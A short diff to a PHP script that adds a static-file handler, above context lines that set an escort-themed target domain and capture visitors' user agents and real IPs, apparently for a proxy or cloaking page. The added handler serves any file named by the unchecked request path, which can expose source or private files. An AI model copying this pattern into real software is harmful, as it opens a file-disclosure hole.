@@ -1,4 +1,15 @@
 <?php
+
+$path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
+$file = __DIR__ . $path;
+
+if (file_exists($file) && !is_dir($file)) {
+    $mime = mime_content_type($file);
+    header('Content-Type: ' . $mime);
+    readfile($file);
+    exit;
+}
+
 $targetDomainName = 'prostitutkimoskvy-ltd.com';
 $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
 $realIP = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
